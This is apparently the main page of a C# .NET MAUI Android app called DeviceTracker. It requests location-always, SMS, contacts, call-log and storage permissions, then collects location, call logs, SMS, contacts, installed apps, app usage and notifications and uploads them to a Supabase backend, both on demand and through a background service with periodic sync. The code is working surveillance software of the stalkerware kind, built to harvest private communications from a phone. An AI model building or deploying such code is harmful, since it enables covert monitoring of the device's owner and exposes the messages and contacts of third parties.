using Android.Content.PM;
using AndroidX.Core.App;
using AndroidX.Core.Content;
using DeviceTracker.Models;
using DeviceTracker.Services;
using Microsoft.Extensions.DependencyInjection;

namespace DeviceTracker;

public partial class MainPage : ContentPage
{
    private DeviceBackgroundService? _bg;
    private LocalDatabaseService? _db;
    private SupabaseService? _sb;

    public MainPage()
    {
        InitializeComponent();

        var svc = IPlatformApplication.Current?.Services;
        _bg = svc?.GetService<DeviceBackgroundService>();
        _db = svc?.GetService<LocalDatabaseService>();
        _sb = svc?.GetService<SupabaseService>();

        RefreshUi();
        _ = InitAsync();
    }

    private async Task InitAsync()
    {
        await Task.Delay(500);
        await CheckRegistrationAsync();
        _ = StartBgAsync();
        _ = PeriodicRefreshAsync();
    }

    // ── Registration ──

    private async Task CheckRegistrationAsync()
    {
        var token = Preferences.Get("device_token", "");
        var serial = Preferences.Get("device_serial", "");

        if (!string.IsNullOrEmpty(token))
        {
            RegStatusLabel.Text = "✅ Registered";
            RegStatusLabel.TextColor = Colors.LightGreen;
            DeviceSerialLabel.Text = $"Serial: {serial}";
            RegisterBtn.IsVisible = false;
        }
        else
        {
            RegStatusLabel.Text = "⚠ Not registered";
            RegStatusLabel.TextColor = Colors.Orange;
            DeviceSerialLabel.Text = serial != "" ? $"Serial: {serial}" : "No serial yet";
            RegisterBtn.IsVisible = true;
        }
    }

    private async void OnRegisterDevice(object? sender, EventArgs e)
    {
        if (_sb == null) { await DisplayAlert("Error", "Supabase service unavailable", "OK"); return; }

        RegisterBtn.IsEnabled = false;
        RegisterBtn.Text = "Registering...";
        RegStatusLabel.Text = "⏳ Registering...";

        try
        {
            var serial = Preferences.Get("device_serial", "");
            if (string.IsNullOrEmpty(serial))
            {
                serial = $"DEV-{Guid.NewGuid():N}"[..20].ToUpper();
                Preferences.Set("device_serial", serial);
            }

            var ok = await _sb.RegisterDeviceAsync(serial);
            if (ok)
            {
                RegStatusLabel.Text = "✅ Registered";
                RegStatusLabel.TextColor = Colors.LightGreen;
                DeviceSerialLabel.Text = $"Serial: {serial}";
                RegisterBtn.IsVisible = false;
            }
            else
            {
                RegStatusLabel.Text = "❌ Registration failed (check Supabase)";
                RegStatusLabel.TextColor = Colors.Red;
            }
        }
        catch (Exception ex)
        {
            RegStatusLabel.Text = $"❌ {ex.Message}";
            RegStatusLabel.TextColor = Colors.Red;
        }
        finally
        {
            RegisterBtn.IsEnabled = true;
            RegisterBtn.Text = "Register Device Now";
        }
    }

    // ── Background Service ──

    private async Task StartBgAsync()
    {
        if (_bg == null) { ServiceStatusLabel.Text = "Service unavailable"; return; }
        try
        {
            await _bg.StartAsync();
            ServiceStatusLabel.Text = "✅ Running";
            ServiceStatusLabel.TextColor = Colors.LightGreen;
        }
        catch (Exception ex)
        {
            ServiceStatusLabel.Text = $"❌ {ex.Message}";
            ServiceStatusLabel.TextColor = Colors.Red;
        }
    }

    // ── Permissions ──

    private async void OnRequestLocationPermission(object? sender, EventArgs e)
    {
        var status = await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
        LocPermStatus.Text = status == PermissionStatus.Granted
            ? "✅ Location: Granted" : "❌ Location: Denied";

        if (status == PermissionStatus.Granted)
        {
            var bg = await Permissions.RequestAsync<Permissions.LocationAlways>();
            if (bg == PermissionStatus.Granted)
                LocPermStatus.Text = "✅ Location: Always";
        }
    }

    private async void OnRequestAllPermissions(object? sender, EventArgs e)
    {
        RequestAllPermBtn.IsEnabled = false;
        RequestAllPermBtn.Text = "Requesting...";

        try
        {
            // Location via MAUI
            await Permissions.RequestAsync<Permissions.LocationWhenInUse>();
            await Permissions.RequestAsync<Permissions.LocationAlways>();

            // Native Android permissions
            var ctx = Platform.CurrentActivity;
            if (ctx == null) return;

            var perms = new[]
            {
                Android.Manifest.Permission.ReadSms,
                Android.Manifest.Permission.ReadContacts,
                Android.Manifest.Permission.ReadCallLog,
                Android.Manifest.Permission.ReadExternalStorage,
                Android.Manifest.Permission.BatteryStats
            };

            var toRequest = perms
                .Where(p => ContextCompat.CheckSelfPermission(ctx, p) != Permission.Granted)
                .ToArray();

            if (toRequest.Length > 0)
                ActivityCompat.RequestPermissions(ctx, toRequest, 0);
        }
        catch { }

        await RefreshUi();
        RequestAllPermBtn.IsEnabled = true;
        RequestAllPermBtn.Text = "Grant All Permissions";
    }

    // ── Collect ──

    private async void OnCollectNow(object? sender, EventArgs e)
    {
        if (_bg == null) { await DisplayAlert("Error", "BG unavailable", "OK"); return; }

        CollectNowBtn.IsEnabled = false;
        CollectNowBtn.Text = "Working...";

        try
        {
            await _bg.DirectCollectAndPushAsync("location", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("call_logs", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("sms", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("contacts", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("apps", CancellationToken.None);
            await _bg.DirectCollectAndPushAsync("state", CancellationToken.None);
            await _sb?.SendHeartbeatAsync();
            await RefreshUi();
            await DisplayAlert("تم", "تم جمع ورفع جميع البيانات مباشرة", "OK");
        }
        catch (Exception ex)
        {
            await DisplayAlert("خطأ", ex.Message, "OK");
        }
        finally
        {
            CollectNowBtn.IsEnabled = true;
            CollectNowBtn.Text = "Collect Data Now";
        }
    }

    // ── Sync ──

    private async void OnForceSync(object? sender, EventArgs e)
    {
        if (_db == null || _sb == null) { await DisplayAlert("Error", "Services unavailable", "OK"); return; }

        ForceSyncBtn.IsEnabled = false;
        ForceSyncBtn.Text = "Syncing...";

        try
        {
            var synced = 0;
            // Location
            foreach (var r in await _db.GetUnsyncedLocationsAsync(200))
            {
                if (await _sb.PushLocationAsync(r))
                { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            }
            // Device State
            foreach (var r in await _db.GetUnsyncedStatesAsync(200))
            {
                if (await _sb.PushDeviceStateAsync(r))
                { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            }
            // Call Logs
            foreach (var r in await _db.GetUnsyncedCallLogsAsync(200))
            {
                if (await _sb.PushCallLogAsync(r))
                { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            }
            // SMS
            foreach (var r in await _db.GetUnsyncedSmsAsync(200))
            {
                if (await _sb.PushSmsAsync(r))
                { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            }
            // Contacts
            foreach (var r in await _db.GetUnsyncedContactsAsync(200))
            {
                if (await _sb.PushContactAsync(r))
                { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            }
            // Installed Apps
            foreach (var r in await _db.GetUnsyncedAppsAsync(200))
            {
                if (await _sb.PushInstalledAppsAsync(new[] { r }))
                { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            }
            // App Usage
            foreach (var r in await _db.GetUnsyncedAppUsageAsync(200))
            {
                if (await _sb.PushAppUsageAsync(r))
                { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            }
            // Notifications
            foreach (var r in await _db.GetUnsyncedNotificationsAsync(200))
            {
                if (await _sb.PushNotificationAsync(r))
                { r.IsSynced = true; await _db.MarkAsSyncedAsync(r); synced++; }
            }
            await _db.CleanOldSyncedRecordsAsync();
            await DisplayAlert("Sync", $"Uploaded {synced} records", "OK");
        }
        catch (Exception ex)
        {
            await DisplayAlert("Sync Failed", ex.Message, "OK");
        }
        finally
        {
            ForceSyncBtn.IsEnabled = true;
            ForceSyncBtn.Text = "Force Sync Now";
        }

        await RefreshUi();
    }

    // ── UI Refresh ──

    private async Task PeriodicRefreshAsync()
    {
        while (true)
        {
            await Task.Delay(15_000);
            MainThread.BeginInvokeOnMainThread(async () => await RefreshUi());
        }
    }

    private async Task RefreshUi()
    {
        try
        {
            // Serial
            var serial = Preferences.Get("device_serial", "");
            DeviceSerialLabel.Text = serial != "" ? $"Serial: {serial}" : "Serial: --";

            // Pending
            if (_db != null)
            {
                var pending = await _db.GetPendingSyncCountAsync();
                PendingSyncLabel.Text = $"Pending Sync: {pending}";
            }

            // Battery & network
            LastBatteryLabel.Text = $"🔋 {Battery.Default.ChargeLevel * 100:F0}%";
            LastNetworkLabel.Text = $"📡 {Connectivity.Current.NetworkAccess}";

            // Permissions status
            var loc = await Permissions.CheckStatusAsync<Permissions.LocationWhenInUse>();
            LocPermStatus.Text = loc == PermissionStatus.Granted
                ? "✅ Location: Granted" : "❌ Location: Not Granted";

            var ctx = Platform.CurrentActivity;
            if (ctx != null)
            {
                SmsPermStatus.Text = ContextCompat.CheckSelfPermission(ctx, Android.Manifest.Permission.ReadSms) == Permission.Granted
                    ? "✅ SMS: Granted" : "❌ SMS: Not Granted";
                CallPermStatus.Text = ContextCompat.CheckSelfPermission(ctx, Android.Manifest.Permission.ReadCallLog) == Permission.Granted
                    ? "✅ Call Log: Granted" : "❌ Call Log: Not Granted";
                ContactPermStatus.Text = ContextCompat.CheckSelfPermission(ctx, Android.Manifest.Permission.ReadContacts) == Permission.Granted
                    ? "✅ Contacts: Granted" : "❌ Contacts: Not Granted";
            }

            BatteryPermStatus.Text = "✅ Battery: Available";
        }
        catch { }
    }
}
